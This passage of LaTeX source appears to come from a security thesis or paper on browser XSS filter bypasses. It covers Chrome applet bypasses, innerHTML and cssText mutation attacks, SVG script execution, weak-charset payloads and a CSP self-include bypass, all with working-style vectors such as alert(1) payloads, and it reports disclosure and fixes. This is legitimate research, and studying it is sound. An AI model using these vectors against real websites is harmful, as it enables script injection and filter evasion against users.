+</applet> 
+\end{lstlisting} 
+
+    The main difference between the injection and the filtered markup is the stripped code attribute value from the \textit{applet} tag. The Chrome/Chromium XSS filter removes the value \textit{x} but allows the attribute itself to be left untouched. This triggers an internal flaw in the targeted browsers, since a lingering but empty code attribute will allow for overriding via the following \textit{param} elements and the attribute \textit{data}. The example shows that the nullification attempts to defuse the tag, yet fails to fully solve the problem. The applet data will load and execute. \\
+
+    If the applet contains code for executing JavaScript as it will be portrayed later on, the JavaScript will execute on the attacked domain - and not \textit{//evil.com}. Adding the parameters supplying additional data, such as the \textit{MAYSCRIPT} attribute, makes this attack work freely and with no issues across domains. Effectively, the XSS filter can be considered successfully bypassed, allowing an attacker to execute arbitrary script code in the context of the targeted domain \textit{example.com}. \\
+
+    The snippet in Listing~\ref{lst:chrome-bypasses-payload} displays the source code of the malicious applet used in the example. The applet can be alternatively loaded from same or different domains. Analogously, this behavior behavior applies for JAR archives and serialized Java applets. \\
+
+\begin{lstlisting}[label=lst:chrome-bypasses-payload,caption=Payload for Java-based Chrome XSS filter bypass utilizing DOM access via JSObject,captionpos=b]
+import java.applet.Applet; 
+import netscape.javascript.*; 
+public class Test extends java.applet.Applet { 
+  public void start() { 
+    try { 
+      JSObject window = JSObject.getWindow(this); 
+      window.eval("alert(location)"); 
+
+    } catch (Exception e) {} 
+  } 
+} 
+\end{lstlisting} 
+
+    The conclusion once again resonates: as long as a browser-based protection mechanisms, such as an XSS filter, have differing visibility from the user agent's render engine, or when it needs to be updated manually in order to be synchronized with the browser features, filter bypasses are likely to happen and be discovered by the attackers. Especially the match-ups between incoming data and resulting rendered output are prone to be bypassed via Unicode based attacks, impedance mismatches between sink and source and asynchronous communication between user agent and filter. The following Sections~\ref{subsubsec:5.4.8.attacks_using_innerhtml} and~\ref{subsubsec:5.4.9.attacks_using_csstext} will discuss a similar yet more grave problem regarding the mentioned impedance mismatches and asynchronous communication helping attacks to smuggle their payload past server, browser and client-side filter solutions. 
+      
+    \subsection{Attacks Using innerHTML}
+    \label{subsubsec:5.4.8.attacks_using_innerhtml}
+
+    Attacks utilizing the \textit{innerHTML} DOM property have received little publicity or research since first being reported by Hasegawa in 2007. We continued his initial research and managed to find many variations and completely new aspects in this vulnerability pattern. This led to crafting attack vectors against many major high traffic websites, web mailers and other platforms managing sensitive data. To understand attacks involving the \textit{innerHTML} property, we will start with a description of the whereabouts of this DOM property and its behavior depending on the user agent in operation.\\
+
+    The \textit{innerHTML} property is a non-standard extension originally specified and implemented by Microsoft in Internet Explorer 4. The intention behind creating and exposing this property was to provide a more convenient way for developers to modify the HTML content of an existing element. Before the availability of \textit{innerHTML}, more complicated ways to construct DOM subtrees inside existing DOM elements had to be chosen, as demonstrated in Listing~\ref{lst:innerhtml-convenience}. 
+
+\begin{lstlisting}[label=lst:innerhtml-convenience,caption=Sample code demonstrating the convenience benefit of innerHTML usage over standard DOM functionality application,captionpos=b]
+// Using DOM functionality to edit element content
+var elm = document.getElementById('table');
+var a = document.createElement('TR');
+var b = document.createElement('TD');
+var c = document.createTextNode('HELLO');
+b.appencChild(c)
+a.appencChild(b)
+elm.appendChild(a);
+
+// using innerHTML to edit element content
+document.getElementById('table').innerHTML='<tr><td>HELLO</td></tr>'
+\end{lstlisting}
+
+
+    Other browser vendors soon adopted the property in spite of its non-standard nature and meanwhile all relevant user agents support \textit{innerHTML} for almost all HTML element instances. One must be aware that the property is being represented by a string value; thus it is not always easy for the layout engine to determine the effects an assignment of \textit{innerHTML} to an existing element has. On that account, if a developer decides to assign a value \texttt{123</div><s>000</s>} to an existing \textit{DIV} element's \textit{innerHTML} property, the browser per intuition should close the DIV element during this assignment process and create a new element with the tag name \textit{S}. However, it differs per specification and implementation. The user agent must not allow breaking existing parent nodes by the \textit{innerHTML} assignment, that is, even if the assigned string would theoretically break out of the container and create new elements. Thus, a user agent has to pre-validate the string 
+before the access happens and following assignment takes place. They need to ensure that the integrity of the document cannot be harmed. The assignments of strings such as \textit{<plaintext>} will not affect the rest of the document after the injection point, but the container element content will be transformed. All browsers we have tested, have treated the content potentially harming the document structure correctly, as per this code snippet: \texttt{<div onclick="innerHTML+='</div><s><plaintext>'">click}. Most user agents ignored the closing \textit{DIV} element and only the older Internet Explorer versions rendered the DIV as a self closing child of the parent container rather that the former option. In some situations, \textit{innerHTML} assignment fails. This is for tables and table rows on older versions of Internet Explorer. Some user agents do not expose an \textit{innerHTML} property for several elements. For instance, in-line SVG code cannot always be rewritten with \textit{innerHTML} access, 
+inline MathML is equally unable to do so.\\
+
+    While improper \textit{innerHTML} assignments might not harm a document structure, \textit{innerHTML} has a different side effect potentially harming website security even when usually sufficient protection against classic XSS has been implemented. The problem is in the actual mutation of the processed string. As the aforementioned examples have shown, the browser tends to pre-validate the assigned string, delete invalid elements and validate existing code, which is believed to be unlikely to break the document structure. This includes closing unclosed tags and different measurements. More interestingly so, several browsers also decode encoded characters, escapes and entities to their canonical representation. Likewise, some browsers remove attribute delimiters and quotes as well as backslashes. These modifications allow attackers to inject harmless payload into a website, that will be ``weaponized'' by later \textit{innerHTML} copy access. A very common field where this kind of access occurs is during 
+the usage of Rich Text Editors (RTE) and JavaScript-heavy interactive applications such as web-mailers, web-based feed readers, aggregation services and other mash-up tools. The following list will give an overview of some of the \textit{innerHTML} based attack patterns that are known today. Please be aware that some attacks remain restricted from publication, since no proper fixes are in place yet and a significant number of users would be at risk upon their dissemination.\\
+
+    To ease research on \textit{innerHTML} copy and access mutations, we created a small tool that has been made publicly available~\footnote{Heiderich, M. et al., \textit{XSS vectors based on innerHTML}, \url{http://html5sec.org/innerhtml} (Dec 2011)}. The tool simply writes input coming in a dynamic manner from a text-area into the \textit{innerHTML} property or an existing element. This property is then being read and its content is being written into a different text-area. The user can afterwards directly see the changes and compare input to output. Using this tool yielded more than 25 critical bugs in several user agents we have reported during our research. Among those were not only XSS and similar vulnerabilities with \textit{innerHTML} handling, but also several exploitable browser crashes. Some of the XSS related vulnerability patterns have been published on the HTML5 Security Cheatsheet~\footnote{Heiderich, M. et al., \textit{innerHTML Attack Vectors}, \url{http://html5sec.org/?innerhtml} (Jan 2012)
+}. Note that the property \textit{outerHTML}, if it is at all supported, is usually affected by the same problems. Furthermore, copy \& paste as well as drag \& drop operations trigger the selfsame transformations that \textit{innerHTML} access does.
+
+    \begin{itemize}
+      %
+     \item \textbf{Back-tick delimiters inside attributes} When copying \textit{innerHTML} from element's container having the element be applied with an attribute such as class, alt or any other attribute accepting arbitrary strings, older versions of Internet Explorer remove the quotes around the \textit{innerHTML} representation if it is considered safe by the layout engine. Example: \texttt{<img alt="abc">} becomes \texttt{<IMG alt=abc>}. As soon as the attribute value contains a space, U+0022 or U+0027, the layout engine will consequently add quotes to protect from a possible injection: \texttt{<img alt="a'bc">} becomes \texttt{<IMG alt="a'bc">} -- note the preserved quotes. In addition to double- and single-quotes or no quotes at all, Internet Explorer allows the back-tick to be used as a delimiter. Surprisingly, the quotes will not be added if the attribute value contains back-ticks instead of whitespace, single- or double-quotes. An attacker can abuse this behavior and craft an attack vector like: \
+texttt{<img src=x alt="``onerror=alert(1)">} or even \texttt{<img src=x alt="\&\#x60\&\#96onerror=alert\\
+\&\#x28;1\&\#41">}. On \textit{innerHTML} access, this data will be converted to the following string: \texttt{<IMG alt=``onerror=alert(1) src="x">} As a result, a new attribute is being created as the error handler and the embedded JavaScript will be executed. Note that the original vector does not indicate any attack attempt for classic XSS filters. Existing filtering solution can either be bypassed with this trick or need to explicitly protect themselves with additional filtering and sanitation routines. HTMLPurifier has to be pinpointed as the one software protecting against this pattern shortly after the layout engine bug was reported.
+      %
+     \item \textbf{CSS escapes inside font-family values} CSS escapes -- as specified in CSS1, and later slightly modified in notation in CSS2, are a way to presumably safe containment of potentially dangerous characters inside the quoted strings. While CSS parsers usually interpret the occurrence of a pair of curled brackets to be a new and empty selector, this selector-less property block and might cause trouble inside quited strings -- while in a CSS escapee representation it would not. Same goes for single- and double-quotes as well as semicolons inside the strings. The structure of a CSS1 escape is notably simple: The escape is being introduced by a backslash (U+005C) and followed by a pair of hexa-decimal characters indicating the escaped character's position in the ASCII table. CSS2 has added a multi-byte support and therefore had to post-specify a new separator as well. CSS2 escapes start with a backslash but can contain up to four (on some user agents) \textit{n} hexa-decimal characters, which are 
+optionally prefix-able with zero. For clear separation, CSS2 escapes use the whitespace character (U+0020)~\footnote{W3C, \textit{4.1.3 Characters and case}, \url{http://www.w3.org/TR/CSS2/syndata.html#characters} (June 2011)}. The problem with \textit{innerHTML} is that user agents, such as older Internet Explorer 7 and 8 and 9, conform to an older document mode and decode those escapes on \textit{innerHTML} access in case they have been used inside a style attribute. The same behavior can be observed on older Firefox version, specifically we mean here all versions before the Firefox 4 major version. The decoding does not happen for style tags unless several conditions unlikely for real-life attacks are met. An example will be drawn to illustrate the whereabout of this behavior and answer to why it can lead to an attack against a well-protected website and filter bypasses. Let us give an illustration: \textit{innerHTML} access to \texttt{<div style="font-family:'foo\textbackslash27\textbackslash3b color\
+textbackslash3ared\textbackslash3b\textbackslash2f\textbackslash2a'">TEST} becomes \texttt{<DIV style="FONT-FAMILY: 'foo';color:red;/*'">TEST</DIV>};\\ 
+     The color of the element will indeed be red. While changing appearance of the elements might only be of value for an attacker in very specific scenarios, Internet Explorer will still allow to escalate this vector to become a XSS attack by simply suing dynamic expressions~\footnote{MSDN, \textit{About Dynamic Properties}, \url{http://msdn.microsoft.com/en-us/library/ms537634(v=vs.85).aspx} (Dec 2011)}. With slight changes of the attack vector substring \texttt{\textbackslash27\textbackslash3bx\textbackslash3a expression(alert(1))\textbackslash2f\textbackslash2a} the vector can be weaponized to execute JavaScript in the context of the injected website's domain. Up till now, those attacks have not been fully patched.
+      %
+     \item \textbf{Double-style attribute attacks} An interesting phenomenon was spotted with older versions of Internet Explorer. The problem relates to the behavior mentioned before, namely the decoded CSS escapes. It only occurs in case an HTML element is being applied with two instead of one style attributes. Once the element container's \textit{innerHTML} property is being accessed, the user agent attempts to merge the two attributes. This causes CSS properties to be overwritten in case they exist once in every attribute. In brief, it allows a concatenation of existing problems unfolding formerly escaped payload. The next example illustrates the problem. Consider the following markup to be wrapped in a container of which the \textit{innerHTML} property is being accessed: \texttt{<div style="font-family:'" style="\textbackslash27\textbackslash3bx=expression(alert(1))\textbackslash3b'">}; The \textit{innerHTML} property value will be transformed to the following string: \texttt{<DIV style="FONT-FAMILY: '; 
+';x: expression(alert(1));'">}\\
+     As it can be seen here, the \textit{font-family} value will be merged together with data from the second style attribute to contain only a semicolon and a whitespace. The following decoded CSS escape will first terminate the string, later terminate the property value pair with a semicolon, and then introduce a bogus property \textit{x} assigned with the value \textit{expression(alert(1))}, which will cause a JavaScript's execution.  These attacks are hard to detect, since the actual attack vector is fragmented over several style attributes and can thus easily evade IDS based filter rules. HTML filtering tools unaware of the DOM grammar of the content to filter have few chances of detecting these kinds of attack. Interestingly enough, this attack was not a working HTMLPurifier bypass, since this tool removes all additional style attributes nor does it attempt to merge them as the Internet Explorer layout engine does. The vulnerability has been reported and fixed for the current releases.
+      %
+     \item \textbf{Inline SVG and XML entity decoding} One rather unexpected vulnerability pattern discovered in recent Firefox versions resulted from the improper HTML entity decoding inside in-line SVG content in HTML5 documents. As described in Section~\ref{subsubsec:5.4.10.attacks_using_svg}, the in-line SVG sections are considered to be XML islands in HTML documents. This forces the parser to accept any non-well formed content. At the same time, it is subjected to repair before being passed on to the XML parser that will ultimately generate the data for the layout engine display. The fact that an actual XML parser is being used by browsers opens possibilities for another obfuscation technique, namely the usage of HTML entities inside plain-text elements for they are equivalently treated as their canonical representations. The sequence \&\#x61; is treated in the same syntactical way inside an XML contained style element as the character \textit{a}. Our research showed that it was possible to go even 
+further and try to represent HTML-relevant characters with HTML entities. On \textit{innerHTML} access the browser decoded the entity as expected and used the canonical representation. The following vector abuses this feature to break out of a style tag by closing it with a sequence of entities, creating a new image element with a sequence of entities. It ultimately uses an error handler to execute JavaScript: \texttt{<svg><style>\&lt/style\&gt;\&ltimg src=x onerror=alert(1)//}. The problem was reported to Mozilla in early 2011 and resulted in the creation of CVE-2011-2369~\footnote{Mozilla.org, \textit{Mozilla Foundation Security Advisory 2011-27}, \url{http://www.mozilla.org/security/announce/2011/mfsa2011-27.html} (June 2011)}. It can be escalated to other browsers by seeking to bypass filters to allow CSS imports. By using either named or decimal- and hexa-decimal entities, an \textit{@} character (U+0040) can be smuggled past IDS and WAF filter rules, while at the same time still working as desired and 
+loading arbitrary remote content. CSS and style-sheets cannot be considered safe content anymore, as we will learn from Section~\ref{subsubsec:6.6.9.security_considerations}. To sum up, an \textit{\@import} injection can be escalated to having similar consequences that a full stack XSS attack. Note that inside the SVG context an XSS via CSS \textit{expression()} on Internet Explorer is not possible -- since inline SVG only works in IE9, IE 10 quirks and standards mode, where CSS expressions are simply not available.
+      %
+     \item \textbf{XML namespaces unwrapping on unknown elements} In comparison to actual HTML elements, older versions of Internet Explorer handle elements outside the HTML4 doc-type based specification in a slightly different way. Several minor flaws were discovered while experimenting with unknown elements. Those included incomplete \textit{innerHTML} data's omission of the opening tag and lack of normalization and case modification for unknown elements. The application XML name-spaces stand out as an interesting aspect of unknown elements. During our research, we found two dissimilar mutation behaviors capable of causing a filter bypass and executing JavaScript upon \textit{innerHTML} access, in spite of the correctly quoted and escaped data. One of the vectors was originally discovered by Silin and persisted on the HTML5 Security Cheatsheet~\footnote{Silin, A., \textit{XSS using "xmlns" attribute in custom tag when copying innerHTML}, \url{http://html5sec.org/#97} (2010)}. 
+     Once a XML namespace is assigned to the unknown element, the resulting \textit{innerHTML} changes completely. It goes from incomplete elements stub to a full blown XHTML ``unknown element'' prepended by a strangely formed XML, which is in turn processing instruction equipped with several references to the namespace. The following example will demonstrate the output we receive and we will then elaborate on it further. Before reading its containers \textit{innerHTML} property, the original data is composed as such: \texttt{<x xmlns="1">2</x>}. Once the \textit{innerHTML} property is accessed, the content mutates into the following string: \texttt{<?XML:NAMESPACE PREFIX = [default] 1 NS = "1" /><x xmlns="1">2</x>}. What can be clearly seen here is that the namespace attribute value is being referenced twice in the generated processing instruction; first as value for the NS attribute which is correctly quoted, and the second time around as value for the PREFIX attribute, prepended by the string \textit{[
+default]} and lacking any form of quoting. This can be used by an attacker in an injection scenario by renaming the namespace to \textit{<x xmlns="><img/src=x onerror=alert(1)">2</x>}. In turn, it will cause a heavily mutated output, that after \textit{innerHTML} access would then consist of this string: \texttt{<?XML:NAMESPACE PREFIX = [default] ><img/src=x onerror=alert(1) NS = "><img/src=x onerror=\\
+     alert(1)" /><x xmlns="><img/src=x onerror=alert(1)">2</x>}; In the face of incoming data being non-evasive and consisting of simple an unknown tag with a correctly quoted attribute, the data will turn into an attack vector as soon as it is processed by the DOM and accessed via its container innerHTML property -- or, consequently, its very own \textit{outerHTML} property. Given the fact that earlier versions of the Internet Explorer are not trusted with HTML5 tags such as \textit{article}, it is possible to use valid and W3C/WHATWG conforming tags and elements to cause the same effect. Aside from that trick, we managed to discover yet another variation based on a different namespace notation. Consider the following input: \texttt{1<x xmlns="a:b:c">2}. After innerHTML access, the resulting output will be surprisingly different from what we could see with the first case and the processing instruction. There are two particular reasons for this occurrence. Firstly, the namespace contains colons indicating a 
+Uniform Resource Name (URN) notation~\footnote{W3C, \textit{2.2 URN Namespaces}, \url{http://www.w3.org/TR/uri-clarification/#urn-namespaces} (Sep 2001)}. Secondly, the elements have no end tag; the closing \textit{</x>} is missing. What is of interest here is the second part of the URN being prepended to the tag in order to reflect the namespace in the \textit{xmlns} distinctive attribute. To exploit this behavior, an attacker would only need to inject a whitespace into the first segment of the URN and thereby be able to turn the actual namespace in its \textit{innerHTML} representation into a different HTML tag. The following example illustrates this and shows the final attack vector. The input is: \texttt{1<x xmlns="a:img src=x onerror=alert(1) ">} but the resulting \textit{innerHTML} will be: \texttt{1<img src=x onerror=alert(1) :x xmlns="a:img src=x onerror=alert(1) "></img src=x onerror=alert(1) :x>}. \\
+     As demonstrated, the whitespace in the namespace is being tolerated and thereby a creation of a new tag instead of the namespace proper application occurs. The rest of the vector simply adds a \textit{src} attribute and an error handler, ultimately executing the JavaScript. In the latter case, benign looking markup can again be submitted to fool server-side filters. The markup will mutate and unfold to an actual attack vector on client-side property access and usage exclusively.
+    \end{itemize}
+
+     Let us point out that we managed to discover quite a few additional vulnerability patterns relating to \textit{innerHTML} based attacks.  This especially holds true when more than one cycle of decoding is being initiated by repeated \textit{innerHTML} access. One vulnerability in a Rich Text Editor we have audited, was only exploitable with a prerequisite of a certain feature having been used repeatedly. Namely, we are referring here to the spell-checking module. With every single access to the spell-checker and its wording suggestions, the \textit{innerHTML} property of the editors body was accessed and replaced with the edited results afterwards. Thus, an n-times encoded CSS- based XSS vector was capable of bypassing even updated and thorough filtering mechanisms by removing an encoding level. This inevitably took place every time the victim has replaced a misspelled word. Ultimately, it led to decoding the vector, which was turned into its canonical representation and executed JavaScript. It turned 
+out that in this particular situation, the server-side removal of backslashes was a solely valid fix available, thereby slightly crippling its functionality for security's sake. Section~\ref{subsubsec:5.4.9.attacks_using_csstext} will provide insight into a similar yet not so well-known problem connected to the DOM element property \textit{cssText}.
+    
+    \subsection{Attacks Using cssText}
+    \label{subsubsec:5.4.9.attacks_using_csstext}
+
+     On several modern browsers, the DOM representation of each element is equipped with a style object containing a \textit{cssText} property. This \textit{cssText} property contains a string version of the element-applied in-line styles. For a HTML element \texttt{<p style="color:red" />} the \textit{cssText} property would read \texttt{color:red}. The property is flagged as read-write, meaning that a developer can influence an element's styles by assigning different values to cssText.\\
+
+     The behavior of this property is in some ways similar to the decoding and mutation behaviors happening in \textit{innerHTML} access described in Section~\ref{subsubsec:5.4.8.attacks_using_innerhtml}. The code shown in Listing~\ref{lst:csstest-attack} demonstrates this behavior and explains how an attacker can break out of existing properties by using CSS escapes against an application accessing and setting an element's \textit{cssText} property. The code further reveals that Internet Explorer and Firefox are prone to attacks abusing the de-compilation feature. Opera does not perform de-compilation and is therefore immune to these offenses, while Google Chrome escapes critical characters with a backslash and also proves immune. 
+
+\begin{lstlisting}[label=lst:csstest-attack,caption=Example for cssText decoding behavior,captionpos=b]
+Incoming data:
+<p style="font-family:'foo\27\3b color:red\3b/* bar'" />
+
+element.style.cssText in Firefox: 
+font-family: 'foo';color:red;/* bar';
+
+element.style.cssText in Chrome:
+font-family: 'foo\';color:red;/* bar';
+
+element.style.cssText in Internet Explorer:
+FONT-FAMILY: 'foo';color:red;/* bar';
+
+element.style.cssText in Opera:
+font-family: 'foo\27\3b color:red\3b/* bar'
+\end{lstlisting}
+
+     The examples shown so far inject no more than an additional color value but they can still be turned into actual attack vectors. One way of doing so would be to have elements either disappearing or alternatively positioned. In an election scenario, the repositioning of elements can have severe consequences. On older versions of the Internet Explorer, an attacker can utilize CSS expressions to execute JavaScript via a \textit{cssText} injection. Despite \textit{cssText} being rather unknown among developers, several high profile frameworks and rich text editors (RTE) make use of this property. During our research devoted to this property and related bypass techniques, we have found several problems with the HTMLPurifier filter-rules and we reported those bugs to the tool's author. Current versions of the HTMLPurifier are protected against those kinds of attacks. However, other server-side filtering libraries might still be vulnerable, unless a fix against this specific problem has been successfully 
+deployed. 
+
+    \subsection{Attacks Using SVG}
+    \label{subsubsec:5.4.10.attacks_using_svg}
+
+    SVG images provide many possibilities for executing Java\-Script in uncommon ways. Many of these are not known to 'typical' web developers and thus are not covered by filter software protecting websites against XSS attacks. SVG Tiny, for example, allows to execute JavaScript by using a \textit{handler} element with an \textit{event} attribute, as shown in Listing~\ref{lst:quirky-svg-xss1}. In case the event assigned to the handler element is specified as \textit{load}, the text content of the handler element will be executed as JavaScript without any user interaction. Blacklist-based XSS filter systems are usually not aware of this manner of executing code, therefore they are not capable of detecting this kind of attacks.\\
+
+\begin{lstlisting}[label=lst:quirky-svg-xss1,caption=Example for uncommon SVG-based JavaScript execution via handler element,captionpos=b]
+<svg xmlns="http://www.w3.org/2000/svg">
+<handler 
+  xmlns:ev="http://www.w3.org/2001/xml-events" 
+  ev:event="load">
+    alert(1)
+</handler>
+</svg>
+\end{lstlisting}
+
+    Another uncommon way of embedding malicious JavaScript in SVG files is shown in Listing~\ref{lst:quirky-svg-xss2}. Using SVG's \textit{set} tag, we dynamically equip an \textit{feImage} tag with an \textit{xlink:href} pointing to a \textit{data:} URI. This type of image element is meant to be used for applying overlay effects for SVG elements utilizing external resources. Shielded by the Base64 encoding, this URI contains another SVG image, which itself contains malicious JavaScript code run immediately upon on loading of the \textit{feImage} element. \\
+
+\begin{lstlisting}[captionpos=b,label=lst:quirky-svg-xss2,caption=Example for uncommon SVG-based JavaScript execution via set element,captionpos=b]
+<svg 
+xmlns="http://www.w3.org/2000/svg" 
+xmlns:xlink="http://www.w3.org/1999/xlink">
+<feImage>
+  <set 
+  attributeName="xlink:href" 
+  to="data:image/svg+xml;charset=utf-8;
+  base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53
+  My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxl
+  cnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
+</feImage>
+</svg>
+\end{lstlisting}
+
+    These and other ways of executing JavaScript from within an SVG file were employed to bypass the filter used by the MediaWiki software, which is not only the most commonly used open source wiki software but also one of the platforms utilized by Wikipedia. We have established contact with the Media\-Wiki team and worked together with them on mitigation and defense strategies against such attacks.\\
+
+    We also tried to load SVG images via a \textit{canvas} element in an HTML website and steal information by using the \texttt{canvas.toDataURL()} feature. This method makes it possible to freeze optical state of a canvas element and transform it into a dataURI for easy saving and later usage. This attack technique for stealing data cross-domains was published by Lawrence in 2009~\cite{lawrence_same_2009}. Nonetheless, it specifically targeted taking over of pixel data cross domain for attacking CAPTCHA mechanisms and similar security instrumentations involving images. We have attempted to use this attack technique in a fresh context and steal whole website screen shots from SVG images being applied with a \textit{foreignObject} tag and cross domain Iframes. Surprisingly, this effort did not end up in any success whatsoever. All tested web browsers reacted with the expected behavior and threw security errors on our tries to execute the \texttt{canvas.toDataURL()} method when accessing the SVG with cross 
+domain content.\\
+
+    One feature distinguishing the rendering behavior between HTML-, XHTML- and XML-based websites and documents in browsers has to be pinpointed to the handling of entities in plain text tags. Those are HTML elements considered to contain plain-text information (such as \textit{script} and \textit{style} tags, as well as \textit{noscript}, \textit{noframes} and \textit{nostyle} tags). While in HTML, documents entities such as \texttt{\&\#x61;} will be treated as such, XHTML and XML documents will have the entity be treated like its canonical representation (e.g., the character \textit{a}). In practical terms, this implies that within a XHTML/XML document the code \texttt{<script>\&\#x61;lert(1)</script>} will execute the \textit{alert} method, while an HTML document with the same content causes the script engine to throw an error.\\
+
+    Not surprisingly, this behavior is mirrored by the SVG files as well, since they are regular XML documents. Interesting in terms of web security, though, is the fact that the same sequence apply to most web browsers when it comes to inline SVG. This connotates that this behavior can be transported to regular HTML documents as soon as they contain an opening \textit{svg} tag somewhere in the markup tree. While the aforementioned \textit{script} tag example will not execute in an HTML document, the variation of \texttt{<svg><script>\&\#61;lert(1)<p>} certainly will. Note that the browsers' parsers are also very tolerant about well-formedness of inline SVG and neither require attribute delimiters nor balanced tags, nor even the closing tags. 
+    The \textit{p} element at the end of the example shown above, suggests to the parser that the inline SVG just ended and an HTML section has started. Thence, the browser automatically closes both the \textit{svg} and \textit{script} tags and momentarily triggers the \textit{alert} method to execute. This technique, combined with an injection, has been tested against the most common XSS filters and significantly helped bypassing most of them. \\
+
+    In Section~\ref{subsubsec:6.6.9.security_considerations} we introduce yet another novel attack technique based on SVG. This attack is capable of having an attacker sniff keystrokes from within a browser or email client and channel them out to an arbitrary domain while requiring no scripting at all. The attack has been reported and has been fixed in most recent versions of the affected browser and mail client.
+
+    \subsection{Attacking Weak Charsets}
+    \label{subsubsec:5.4.11.attacking_weak_charsets}
+
+    In recent years, character sets (also referred to as charsets for short) and their implementations in browsers have been a welcoming target for attackers and security researchers. Hasegawa has published a large body of research into weaknesses of charset implementations in modern browsers as of the year 2004. He managed to cover UTF-7 based attacks along with filter bypasses based on EUC-JP and Shift\_JIS charset implementations~\footnote{Hasegawa, Y., \textit{UTF-8.jp}, \url{http://utf-8.jp/} (Feb 2012)}. Essentially, broken charsets enable the creation of invalid characters or multi-byte character sequences bypassing server-side filters and causing invalid rendering results by the layout engine of the user agent.\\ 
+
+     Our 2009 research investigated browsers such as Firefox 3.5, Opera 10 and Chrome 4~\footnote{Heiderich et al., \textit{Web Application Obfuscation}, \url{http://goo.gl/mFv87} (Sept 2010)}. We generated sequences of characters encoded in the charsets EUC-JP, Shift\_JIS, both character sets meant to encode Japanese characters. We also investigated Big5; this is a charset used to encode traditional Chinese characters, primarily and foremost used in Taiwan, China and Macao. Those three charsets have been known to be vulnerable in many browser implementations since the research published by Hansen in 2007~\footnote{Hanson, R., \textit{Charset Vulnerabilities}, \url{http://ha.ckers.org/charsets.html} (Jan 2012)}. We have tested these charsets and their capabilities to turn invalid multi-byte sequences into two separate characters or causing subsequent characters to disappear in a HTML injection context. The results indicated possibilities to overturn formerly safe HTML websites into being vulnerable and 
+exploitable. This was obtained by simple contextual changes of the parameters through a removal of existing characters, effectively keeping existing attributes from being closed. The browser security handbook further advises to take special care in regards to broken charsets in case no HTML attribute delimiters are being used~\footnote{Zalewski, M. et al., \textit{Character set handling and detection}, \url{http://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection} (2010)}. \\
+
+     Similar problems, namely turning safe websites into being vulnerable by using weak charsets and bypassing server-side filters, become apparent when one is dealing with charsets from the Mac family. Hasegawa reported problems in Firefox 3.x handling \textit{MacFarsi} allowing to use substitute characters for U+003C and U+003E, and effectively enabling a bypass of any XSS filter on websites encoded in this charset~\footnote{Hasegawa, Y. et al., \textit{Mozilla Foundation Security Advisory 2010-84}, \url{http://www.mozilla.org/security/announce/2010/mfsa2010-84.html} (2010)}. 
+     Our own research unveiled possibilities to use crippled UTF-7 and X-IMAP-Modified-UTF7 entities in the browser context and still force the layout engine to render valid markup. Those problems have been fixed with the release of Firefox 4 and later versions~\footnote{Heiderich, M. et al, \textit{Charset Attack Vectors}, \url{http://html5sec.org/?charset} (Feb 2012)}. The code shown in Listing~\ref{lst:weak-charset-xmp} illustrates some of the example snippets causing XSS filter bypasses.
+
+\begin{lstlisting}[captionpos=b,label=lst:weak-charset-xmp,caption=Executing JavaScript utilizing vulnerable and improperly implemented charsets,captionpos=b]
+<meta charset="x-imap4-modified-utf7">
+  &ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA
+  &AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEA
+  KQ&ACAAPABi
+
+<meta charset="x-imap4-modified-utf7">
+  &<script&S1&TS&1>alert&A7&(1)&R&UA;
+  &&<&A9&11/script&X&>
+
+<meta charset="mac-farsi">¼script¾alert(1)¼/script¾
+\end{lstlisting}
+
+    Concluding the coverage on vulnerable charsets, we must underline that the most prevalent problem is the mismatch between string content being submitted to the server and the content actually rendered by the user agent. Most of the mentioned attacks can do no visible harm to the server, as the character sequences indicate no attack and will not match any filter rules if this lack persists. The browser nevertheless decodes the received data in a non-standard and overly tolerant way, effectively turning the invalid entities and characters into strings potentially executing JavaScript. A server-side filtering solution can only protect against this kind of attack by knowing the browser implementation problem and delivering a precise fix, while at the same time it must work on how not to cripple any valid content during this process. A client-side protection layer would not be affected by any charset obfuscation since the markup has already been converted into its final state and can therefore be inspected in 
+its canonical representation. Executed JavaScript code can be wrapped, inspected and judged. Weak charsets have further potential to wreak havoc, for especially in case of exotic variant such as Extended Binary Coded Decimal Interchange Code (EBCDIC) and similar code pages, a comparably low amount research has been published up till today. Considering the fact that even relatively modern browser have been reported vulnerable against charset inheritance attacks few years ago, more exploitable vulnerabilities of this category might be reported in the future~\footnote{Secunia, \textit{Secunia Advisory SA27907}, \url{http://secunia.com/advisories/27907/} (Dec 2007)}. 
+
+    \subsection{Bypassing CSP}
+    \label{subsubsec:5.4.12.bypassing_csp}
+
+    Content Security Policy (CSP) -- as introduced in Section~\ref{subsec:4.5.content_security_policy} -- is a proposed and party implemented approach to mitigate classic XSS attacks in modern browsers. CSP tries to decrease browsers' capabilities to execute potentially malicious content definable by an administrator-controlled policy delivered either via HTTP headers or meta tags on the protected domain. Most importantly, CSP prohibits the use of \textit{eval()} or eval-like functions and statements, and equally denies usage of inline scripts and plug-in containers if not defined differently in the policy directives. Finally, it permits a developer to specify which domains are permitted to load and execute JavaScript code from. \\
+
+    If we consider two of the most important components of CSP for protecting against script injections (those being: blocking inline script and allowing only white-listed domains to load and execute outline script), a successful attempt to bypass the protection should ideally include a way to emulate the permitted ways of scripting. This can be accomplished by using a technique first published by Heyes in 2009~\footnote{Heyes, G., \textit{CSP -- Mozilla content security policy}, \url{http://www.thespanner.co.uk/2009/06/23/csp-mozilla-content-security-policy/} (June 2009)}. The attack utilized an injection of pure JavaScript at the beginning of the document, then injected a script tag into the header area and set its \textit{src} attribute to \texttt{?nocache}. This effectuated in the script tag loading the page it resides on and executing the content it first finds, that is to say - the injected JavaScript code. The code sample shown in Listing~\ref{lst:csp-bypass-1} illustrates the attack. Surprisingly, 
+this approach still works on most CSP-enabled user agents today. A valid fix would include a MIME type check for resources loaded by script tags once CSP is enabled.
+
+\begin{lstlisting}[captionpos=b,label=lst:csp-bypass-1,caption=Bypassing CSP via self-including JavaScript; the src=?nocache has the file include itself and execute the payload alert(1),captionpos=b]
+<?php 
+header("X-Content-Security-Policy: allow 'self'");
+header("X-WebKit-CSP: default-src 'self'"); 
+?>
+alert(1)//<script src="?nocache"></script>
+\end{lstlisting}
+
